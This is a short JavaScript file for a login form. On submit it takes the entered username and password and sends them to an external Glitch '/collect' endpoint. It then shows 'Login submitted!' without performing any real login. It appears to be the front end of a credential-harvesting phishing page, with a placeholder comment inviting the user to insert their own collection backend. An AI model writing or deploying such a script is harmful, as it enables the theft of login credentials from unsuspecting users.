console.log("script.js loaded");
// Change this to your actual Glitch backend URL!
const endpoint = "https://aware-flower-muenster.glitch.me/collect";

document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById('loginForm');
    const message = document.getElementById('message');

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        // Show loading feedback
        message.textContent = "Logging in...";

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        })
        .then(response => {
            if (!response.ok) throw new Error("Network response was not OK");
            message.textContent = "Login submitted!";
            message.style.color = "green";
            form.reset();
        })
        .catch(error => {
            message.textContent = "There was an error submitting the login.";
            message.style.color = "red";
            console.error('Error sending credentials:', error);
        });
    });
});
